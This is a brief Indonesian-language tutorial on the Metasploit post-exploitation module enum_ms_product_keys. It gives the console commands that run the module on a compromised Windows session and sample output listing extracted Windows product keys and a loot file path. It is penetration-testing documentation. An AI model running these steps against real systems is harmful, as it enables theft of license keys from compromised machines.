# enum_ms_product_keys

Modul `enum_ms_product_keys` di Metasploit adalah modul `post-exploitation` untuk sistem Windows yang digunakan untuk mengekstrak `product key` (kunci lisensi) dari berbagai produk Microsoft yang terinstal, seperti `Windows` dan `Office`, dengan membaca dan mendekode data dari `registry`.

## Cara Penggunaan di Metasploit

```
use post/windows/gather/enum_ms_product_keys
set SESSION <ID>
set VERBOSE true
run
```

Hasil output-nya seperti ini:

```
[*] Finding Microsoft product keys on ADMIN-PC (192.168.1.53)

Keys
====

 Product             Registered Owner  Registered Organization  License Key
 -------             ----------------  -----------------------  -----------
 Windows 7 Ultimate  admin                                      D4F6K-QK3RD-TMVMJ-BBMRX-3MBMV
 Windows 7 Ultimate  admin                                      JVF76-6TMPY-98BXW-76B7Q-TCGTV


[+] Product keys stored in: /root/.msf4/loot/20250517034031_default_192.168.1.53_host.ms_keys_620108.txt
[*] Post module execution completed
```
